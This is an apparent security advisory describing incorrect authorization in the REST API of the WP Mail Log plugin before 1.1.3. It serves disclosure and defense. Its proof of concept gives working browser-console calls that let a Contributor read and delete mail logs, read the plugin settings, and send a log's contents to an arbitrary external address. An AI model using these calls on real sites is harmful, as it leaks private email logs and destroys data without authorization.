## WordPress Plugin Vulnerabilities

# WP Mail Log < 1.1.3 – Incorrect Authorization in REST API Endpoints

### Description

The plugin does not correctly authorize its REST API endpoints, allowing users with the Contributor role to view and delete data that should only be accessible to Admin users.

### Proof of Concept

The following actions may be taken by a Contributor user:
---
/wml\_logs - Information leak
Execute the following within a block editor page to read the logs:
await wp.apiFetch({path: 'wml/v1/wml\_logs', method: 'POST', data: {pageSize: 10}});
---
/wml\_logs/delete - Arbitrary log deletion
Execute the following within a block editor page to delete a log entry, ensuring the `data` array includes a valid ID for a log entry:
await wp.apiFetch({path: 'wml/v1/wml\_logs/delete', method: 'POST', data: [1]});
---
/settings
Execute the following within a block editor page to get the plugin settings:
await wp.apiFetch({path: 'wml/v1/settings', method: 'POST', data: {callback: 'get'}});
---
/wml\_logs/send\_mail
Execute the following on any page of the site to send the information within a log to an arbitrary email address, ensuring the `id` parameter is a valid ID for a log entry.
var nonce = await (await fetch('/wp-admin/admin-ajax.php?action=rest-nonce')).text();
await (await fetch('/wp-json/wml/v1/wml\_logs/send\_mail', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded', 'X-WP-Nonce': nonce}, body: 'id=1&to\_email=send@example.com'})).text();
